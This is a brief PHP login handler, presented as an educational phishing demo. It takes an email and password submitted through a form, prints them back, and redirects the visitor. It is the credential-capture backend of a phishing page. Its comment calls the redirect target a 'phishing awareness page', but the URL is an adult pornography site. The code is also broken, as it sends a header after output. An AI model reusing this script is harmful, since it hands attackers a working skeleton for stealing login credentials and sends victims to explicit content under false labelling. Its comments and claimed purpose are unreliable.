<?php
// This script is for educational purposes only and does not store any data
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = htmlspecialchars($_POST['email']);
    $password = htmlspecialchars($_POST['password']);
    
    // Log the attempted login (in a real phishing attack, this data would be maliciously stored)
    // For educational purposes, we will simply display it back
    echo "Email: " . $email . "<br>";
    echo "Password: " . $password . "<br>";
    
    // Redirect to a phishing awareness page
    header("Location: https://www.xnxx.com/");
    exit();
}
?>
